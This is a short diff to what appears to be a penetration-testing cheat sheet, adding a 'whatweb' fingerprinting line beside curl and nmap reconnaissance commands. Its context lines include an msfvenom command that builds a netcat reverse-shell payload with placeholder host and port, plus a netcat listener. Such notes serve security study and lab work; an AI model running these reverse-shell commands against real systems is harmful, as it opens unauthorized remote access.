@@ -44,6 +44,7 @@ cat file.txt            # Read
 #Webserver version
 curl -I https://example.com
 nmap -sV -p 80,443 example.com
+whatweb url
 -msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 
 start listen nc -lnvp 444
 nc <ip> 22
